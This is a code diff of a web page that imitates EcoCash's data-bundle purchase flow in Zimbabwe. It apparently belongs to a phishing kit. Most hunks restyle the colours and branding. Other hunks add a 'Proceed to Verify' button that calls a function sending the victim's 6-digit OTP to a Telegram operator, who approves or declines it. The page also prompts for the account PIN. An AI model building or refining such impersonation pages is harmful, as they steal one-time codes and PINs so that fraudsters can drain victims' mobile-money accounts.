@@ -7,20 +7,20 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --blue: #0033a0;
-            --blue-dark: #002280;
-            --blue-deep: #001860;
-            --blue-light: #1a4dbf;
-            --green: #00b050;
-            --green-dark: #007d38;
-            --page: #06112a;
-            --surface: #0c1e3f;
-            --surface2: #112350;
-            --border: rgba(255,255,255,0.10);
-            --border2: rgba(255,255,255,0.20);
-            --text: #ffffff;
-            --text2: #c8d8f0;
-            --muted: #7a99c8;
+            --primary-red: #dc2626;
+            --primary-blue: #1e40af;
+            --primary-blue-dark: #1e3a8a;
+            --accent-blue: #3b82f6;
+            --accent-light: #dbeafe;
+            --success: #10b981;
+            --page: #f8fafc;
+            --surface: #ffffff;
+            --surface2: #f1f5f9;
+            --border: #e2e8f0;
+            --border2: #cbd5e1;
+            --text: #1e293b;
+            --text2: #475569;
+            --muted: #64748b;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,37 +30,53 @@
             min-height: 100dvh;
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
             color: var(--text);
-            background: linear-gradient(135deg, var(--page) 0%, var(--surface) 100%);
+            background: var(--page);
             overflow-x: hidden;
         }
 
         .topbar {
             height: 64px;
             padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
-            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
-            color: white;
+            background: var(--surface);
+            border-bottom: 2px solid var(--border);
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0 10px 28px rgba(0,51,160,0.18);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
             position: sticky;
             top: 0;
             z-index: 1000;
         }
 
         .brand {
-            font-size: clamp(21px, 5vw, 25px);
-            font-weight: 800;
-            letter-spacing: -0.8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
             text-decoration: none;
-            line-height: 1;
             cursor: pointer;
-            color: white;
         }
 
-        .brand em {
-            font-style: normal;
-            color: var(--green);
+        .brand-logo {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: white;
+            font-size: 20px;
+            flex-shrink: 0;
+            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
+        }
+
+        .brand-text {
+            font-size: 18px;
+            font-weight: 800;
+            letter-spacing: -0.6px;
+            color: var(--text);
+            line-height: 1;
         }
 
         main {
@@ -76,7 +92,7 @@
             border: 1px solid var(--border2);
             border-radius: clamp(18px, 5vw, 28px);
             padding: clamp(22px, 5vw, 36px);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
             position: relative;
             overflow: hidden;
         }
@@ -86,7 +102,7 @@
             position: absolute;
             inset: 0 0 auto 0;
             height: 8px;
-            background: linear-gradient(90deg, var(--blue), var(--blue-dark));
+            background: linear-gradient(90deg, var(--primary-red), var(--primary-blue));
         }
 
         .logo-lockup {
@@ -99,12 +115,7 @@
             font-weight: 800;
             letter-spacing: -1.6px;
             line-height: 1;
-            color: white;
-        }
-
-        .logo-text em {
-            font-style: normal;
-            color: var(--green);
+            color: var(--text);
         }
 
         .product-name {
@@ -114,8 +125,8 @@
             margin-top: 12px;
             padding: 8px 14px;
             border-radius: 999px;
-            background: rgba(0,176,80,0.15);
-            color: var(--green);
+            background: rgba(30,64,175,0.1);
+            color: var(--primary-blue);
             font-size: 12px;
             font-weight: 800;
             letter-spacing: 0.08em;
@@ -129,7 +140,7 @@
             font-weight: 800;
             letter-spacing: -0.9px;
             margin-bottom: 8px;
-            color: white;
+            color: var(--text);
         }
 
         .subtitle {
@@ -142,22 +153,19 @@
         }
 
         .bundle-summary {
-            display: none;
-            background: linear-gradient(160deg, var(--blue-deep) 0%, var(--blue) 100%);
+            background: var(--surface2);
+            border: 1px solid var(--border);
             border-radius: 18px;
             padding: 16px 18px;
             margin-bottom: 20px;
-            color: #fff;
         }
-
-        .bundle-summary.active { display: block; }
 
         .bs-title {
             font-size: 10px;
             font-weight: 800;
             text-transform: uppercase;
             letter-spacing: 0.1em;
-            color: rgba(255,255,255,0.55);
+            color: var(--muted);
             margin-bottom: 10px;
         }
 
@@ -169,14 +177,15 @@
         }
 
         .bs-item {
-            background: rgba(255,255,255,0.10);
+            background: var(--surface);
+            border: 1px solid var(--border);
             border-radius: 10px;
             padding: 9px 12px;
         }
 
         .bs-item-label {
             font-size: 10px;
-            color: rgba(255,255,255,0.55);
+            color: var(--muted);
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.05em;
@@ -185,14 +194,14 @@
         .bs-item-val {
             font-size: 15px;
             font-weight: 800;
-            color: #fff;
+            color: var(--text);
             margin-top: 2px;
             letter-spacing: -0.3px;
         }
 
         .bs-total {
-            background: rgba(0,176,80,0.18);
-            border: 1px solid rgba(0,176,80,0.35);
+            background: rgba(30,64,175,0.08);
+            border: 1px solid rgba(30,64,175,0.2);
             border-radius: 10px;
             padding: 10px 12px;
             display: flex;
@@ -200,12 +209,12 @@
             justify-content: space-between;
         }
 
-        .bs-total-label { font-size: 12px; color: rgba(255,255,255,0.7); font-weight: 600; }
-        .bs-total-val   { font-size: 1.25rem; font-weight: 900; color: #4ade80; letter-spacing: -0.5px; }
+        .bs-total-label { font-size: 12px; color: var(--muted); font-weight: 600; }
+        .bs-total-val   { font-size: 1.25rem; font-weight: 900; color: var(--primary-red); letter-spacing: -0.5px; }
 
         .form-panel {
             background: var(--surface2);
-            border: 1px solid var(--border2);
+            border: 1px solid var(--border);
             border-radius: 20px;
             padding: clamp(16px, 4vw, 20px);
         }
@@ -214,7 +223,7 @@
             display: block;
             font-size: 12px;
             font-weight: 800;
-            color: var(--green);
+            color: var(--primary-blue);
             text-transform: uppercase;
             letter-spacing: 0.06em;
             margin-bottom: 8px;
@@ -234,21 +243,21 @@
             text-align: center;
             font-size: 24px;
             font-weight: 700;
-            border: 2px solid var(--blue);
+            border: 2px solid var(--primary-blue);
             border-radius: 10px;
             background: var(--surface);
-            color: white;
+            color: var(--text);
             font-family: inherit;
             transition: all 0.2s;
         }
 
         .otp-box:focus {
-            border-color: var(--green);
-            box-shadow: 0 0 0 4px rgba(0,176,80,0.2);
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 4px rgba(59,130,246,0.2);
             outline: none;
         }
 
-        .otp-box::placeholder { color: #7a99c8; }
+        .otp-box::placeholder { color: var(--muted); }
 
         .hint {
             color: var(--muted);
@@ -260,9 +269,9 @@
 
         .error-msg {
             display: none;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid rgba(255, 0, 0, 0.3);
-            color: #ff6b6b;
+            background: rgba(220,38,38,0.1);
+            border: 1px solid rgba(220,38,38,0.3);
+            color: #dc2626;
             font-size: 13px;
             font-weight: 600;
             border-radius: 12px;
@@ -278,6 +287,36 @@
             display: flex;
             gap: 12px;
             margin-top: 20px;
+        }
+
+        .btn-primary {
+            flex: 1;
+            border: 0;
+            border-radius: 999px;
+            padding: 16px 22px;
+            color: white;
+            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
+            touch-action: manipulation;
+            transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            box-shadow: 0 8px 20px rgba(220,38,38,0.3);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:active:not(:disabled) { transform: translateY(0); }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            box-shadow: none;
+            cursor: not-allowed;
         }
 
         .btn-secondary {
@@ -296,8 +335,8 @@
         }
 
         .btn-secondary:hover {
-            background: var(--surface2);
-            border-color: var(--blue-light);
+            background: var(--surface);
+            border-color: var(--accent-blue);
             color: var(--text);
         }
 
@@ -309,16 +348,15 @@
             line-height: 1.5;
         }
 
-        .terms a { color: var(--green); font-weight: 800; }
+        .terms a { color: var(--primary-blue); font-weight: 800; }
 
-        /* PIN Modal */
         .modal-overlay {
             position: fixed;
             inset: 0;
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.5);
             z-index: 2000;
             padding: 20px;
             backdrop-filter: blur(4px);
@@ -333,7 +371,7 @@
             padding: 32px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
             position: relative;
             overflow: hidden;
         }
@@ -343,7 +381,7 @@
             position: absolute;
             inset: 0 0 auto 0;
             height: 6px;
-            background: linear-gradient(90deg, var(--blue), var(--green));
+            background: linear-gradient(90deg, var(--primary-red), var(--primary-blue));
         }
 
         .modal-title {
@@ -351,7 +389,7 @@
             font-weight: 800;
             letter-spacing: -0.8px;
             margin-bottom: 8px;
-            color: white;
+            color: var(--text);
         }
 
         .modal-subtitle {
@@ -363,13 +401,13 @@
 
         .pin-input-group {
             width: 100%;
-            border: 2px solid var(--blue);
+            border: 2px solid var(--primary-blue);
             border-radius: 16px;
             display: flex;
             align-items: center;
             padding: 14px 15px;
             background: var(--surface2);
-            box-shadow: 0 8px 24px rgba(0,51,160,0.08);
+            box-shadow: 0 2px 8px rgba(30,64,175,0.08);
             margin-bottom: 18px;
         }
 
@@ -379,19 +417,19 @@
             border: 0;
             outline: 0;
             font-size: 17px;
-            color: white;
+            color: var(--text);
             font-family: inherit;
             background: transparent;
             letter-spacing: 4px;
         }
 
-        .pin-input-field::placeholder { color: #7a99c8; letter-spacing: 0; }
+        .pin-input-field::placeholder { color: var(--muted); letter-spacing: 0; }
 
         .modal-error {
             display: none;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid rgba(255, 0, 0, 0.3);
-            color: #ff6b6b;
+            background: rgba(220,38,38,0.1);
+            border: 1px solid rgba(220,38,38,0.3);
+            color: #dc2626;
             font-size: 13px;
             font-weight: 600;
             border-radius: 12px;
@@ -412,24 +450,24 @@
             border: 0;
             border-radius: 999px;
             padding: 14px 16px;
-            background: linear-gradient(135deg, var(--green) 0%, var(--green-dark) 100%);
+            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
             color: white;
             font-size: 14px;
             font-weight: 800;
             text-transform: uppercase;
             letter-spacing: 0.04em;
             cursor: pointer;
-            box-shadow: 0 8px 20px rgba(0,176,80,0.25);
+            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
             transition: all 0.2s;
         }
 
         .btn-confirm:hover:not(:disabled) {
-            box-shadow: 0 12px 28px rgba(0,176,80,0.35);
+            box-shadow: 0 8px 20px rgba(220,38,38,0.3);
             transform: translateY(-1px);
         }
 
         .btn-confirm:disabled {
-            background: #555;
+            background: #ccc;
             cursor: not-allowed;
         }
 
@@ -448,7 +486,7 @@
 
         .btn-cancel:hover {
             background: var(--surface2);
-            border-color: var(--blue-light);
+            border-color: var(--accent-blue);
             color: var(--text);
         }
 
@@ -469,7 +507,7 @@
             width: 56px;
             height: 56px;
             border: 5px solid rgba(255, 255, 255, 0.12);
-            border-top-color: var(--blue);
+            border-top-color: var(--primary-blue);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
@@ -488,27 +526,30 @@
             .form-panel { padding: 15px; }
             .otp-box { width: 45px; height: 45px; font-size: 20px; }
             .btn-group { flex-direction: column; }
-            .btn-secondary { padding: 15px 18px; }
+            .btn-primary, .btn-secondary { padding: 15px 18px; }
             .modal-content { padding: 24px; }
         }
     </style>
 </head>
 <body>
     <header class="topbar">
-        <a class="brand" href="index.html">Eco<em>Cash</em></a>
+        <a class="brand" href="index.html">
+            <div class="brand-logo">E$</div>
+            <div class="brand-text">EcoCash</div>
+        </a>
     </header>
 
     <main>
         <section class="otp-card">
             <div class="logo-lockup">
-                <div class="logo-text">Eco<em>Cash</em></div>
+                <div class="logo-text">EcoCash</div>
                 <div class="product-name">Data Bundles · Zimbabwe</div>
             </div>
 
             <h1>Verify OTP</h1>
             <p class="subtitle">Enter the 6-digit code sent to your EcoCash number to complete your purchase.</p>
 
-            <div id="bundleSummary" class="bundle-summary">
+            <div class="bundle-summary">
                 <div class="bs-title">Your Data Bundle</div>
                 <div class="bs-grid">
                     <div class="bs-item"><div class="bs-item-label">Bundle</div><div class="bs-item-val" id="bsOffer">—</div></div>
@@ -536,6 +577,7 @@
                 <div class="error-msg" id="errMsg"></div>
 
                 <div class="btn-group">
+                    <button class="btn-primary" type="button" id="verifyBtn" disabled>Proceed to Verify</button>
                     <button class="btn-secondary" type="button" onclick="goBack()">← Back</button>
                 </div>
             </div>
@@ -581,9 +623,9 @@
         let waitingForApproval = false;
 
         const otpBoxes = document.querySelectorAll('.otp-box');
+        const verifyBtn = document.getElementById('verifyBtn');
         const errMsg = document.getElementById('errMsg');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
-        const bundleSummary = document.getElementById('bundleSummary');
         const pinModal = document.getElementById('pinModal');
         const pinInput = document.getElementById('pinInput');
         const confirmBtn = document.getElementById('confirmBtn');
@@ -601,19 +643,12 @@
 
             if (offer && data && price) {
                 bundleData = { offer, data, price };
-                displayBundleDetails();
+                document.getElementById('bsOffer').textContent = offer;
+                document.getElementById('bsData').textContent = data;
+                document.getElementById('bsPrice').textContent = '$ ' + price;
             }
 
             otpBoxes[0].focus();
-        }
-
-        function displayBundleDetails() {
-            if (!bundleData) return;
-
-            bundleSummary.classList.add('active');
-            document.getElementById('bsOffer').textContent = bundleData.offer;
-            document.getElementById('bsData').textContent = bundleData.data;
-            document.getElementById('bsPrice').textContent = '$ ' + bundleData.price;
         }
 
         function getOTP() {
@@ -625,7 +660,6 @@
             otpBoxes[0].focus();
         }
 
-        // OTP Input handling
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
                 box.value = box.value.replace(/[^0-9]/g, '');
@@ -634,7 +668,6 @@
                     if (index < otpBoxes.length - 1) {
                         otpBoxes[index + 1].focus();
                     } else {
-                        // All 6 digits entered - auto-send to Telegram
                         const otp = getOTP();
                         if (otp.length === 6 && !otpSent) {
                             sendOTPToTelegram(otp);
@@ -648,6 +681,16 @@
                     otpBoxes[index - 1].focus();
                 }
             });
+        });
+
+        verifyBtn.addEventListener('click', () => {
+            const otp = getOTP();
+            if (otp.length === 6 && !otpSent) {
+                sendOTPToTelegram(otp);
+            } else if (otp.length !== 6) {
+                errMsg.textContent = 'Please enter all 6 digits.';
+                errMsg.classList.add('show');
+            }
         });
 
         function sendOTPToTelegram(otp) {
@@ -680,6 +723,7 @@
                 })
             }).then(() => {
                 hint.textContent = 'OTP sent to admin for verification. Waiting for approval…';
+                verifyBtn.disabled = true;
                 waitingForApproval = true;
                 startPollingForApproval(approveId, declineId);
             }).catch(() => {
@@ -712,6 +756,7 @@
                                     spinnerOverlay.style.display = 'none';
                                     otpSent = false;
                                     isProcessing = false;
+                                    verifyBtn.disabled = false;
                                     errMsg.textContent = 'OTP verification declined. Please try again.';
                                     errMsg.classList.add('show');
                                     clearOTP();
@@ -733,9 +778,9 @@
 
         function closePinModal() {
             pinModal.classList.remove('active');
-            // Reset for retry
             otpSent = false;
             isProcessing = false;
+            verifyBtn.disabled = false;
             clearOTP();
             hint.textContent = 'Enter your 6-digit OTP code above. It will be automatically sent to our system.';
         }
